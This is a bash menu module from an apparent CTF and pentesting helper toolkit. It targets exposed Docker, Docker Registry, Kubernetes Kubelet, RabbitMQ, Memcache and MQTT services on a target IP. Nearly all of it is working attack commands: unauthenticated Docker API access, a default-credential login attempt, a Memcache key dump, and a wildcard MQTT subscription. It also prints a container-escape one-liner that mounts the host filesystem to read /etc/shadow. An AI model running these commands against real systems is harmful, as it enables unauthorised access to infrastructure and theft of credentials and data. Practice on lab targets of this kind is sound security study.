#!/bin/bash
# CTF_HELPER - Modern Stack & Cloud Services Module
# Targets: Docker (2375/2376), Docker Registry (5000), Kubernetes (6443/10250), 
#          RabbitMQ (15672), Memcache (11211), MQTT (1883)

source ./ctf_helper.sh

echo -e "${C6}[MODULE: MODERN STACK & CLOUD]${NC}"
echo -e "Target: ${C3}$TARGET_IP${NC}\n"

echo "1) Docker API (2375/76)   - Container Escape & RCE"
echo "2) Docker Registry (5000) - Image Extraction & Creds Leak"
echo "3) Kubernetes (6443/10250)- Kubelet API & Cluster Recon"
echo "4) RabbitMQ (15672/5672)  - Default Management Creds"
echo "5) Memcache (11211)       - Unauth Memory Dump"
echo "6) MQTT (1883)            - Topic Subscription & Data Leak"
echo "0) Back to Network Menu"

echo -ne "\n${C5}modern_services > ${NC}"
read mopt

case $mopt in
    1) # Docker API - 2375-pentesting-docker.md
        echo -e "${C4}[*] Checking for Exposed Docker Socket...${NC}"
        docker -H tcp://"$TARGET_IP":2375 ps 2>/dev/null
        nmap -p 2375,2376 --script docker-version-info "$TARGET_IP"
        echo -e "\n${C3}Manual Tip: docker -H tcp://$TARGET_IP:2375 run -v /:/mnt/host alpine cat /mnt/host/etc/shadow${NC}"
        ;;
    2) # Docker Registry - 5000-pentesting-docker-registry.md
        echo -e "${C4}[*] Enumerating Docker Registry...${NC}"
        curl -s http://"$TARGET_IP":5000/v2/_catalog | jq .
        echo -e "${C3}Tip: Check /v2/<repo>/tags/list for available versions.${NC}"
        ;;
    3) # Kubernetes - 44134-pentesting-tiller-helm.md & K8s notes
        echo -e "${C4}[*] Probing Kubelet & API Server...${NC}"
        curl -sk https://"$TARGET_IP":10250/pods | jq .
        nmap -p 6443,10250,10255 --script kubelet-api "$TARGET_IP"
        ;;
    4) # RabbitMQ - 15672-pentesting-rabbitmq-management.md
        echo -e "${C4}[*] Checking RabbitMQ Management Portal (guest:guest)...${NC}"
        curl -i -u guest:guest http://"$TARGET_IP":15672/api/whoami
        ;;
    5) # Memcache - 11211-memcache/
        echo -e "${C4}[*] Dumping Memcache Keys...${NC}"
        echo -e "stats items\nstats cachedump 1 0\nquit" | nc -vn "$TARGET_IP" 11211
        ;;
    6) # MQTT - 1883-pentesting-mqtt-mosquitto.md
        echo -e "${C4}[*] Subscribing to all MQTT topics...${NC}"
        mosquitto_sub -h "$TARGET_IP" -t "#" -v
        ;;
    0) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to continue..."
./modules/network/modern_services.sh
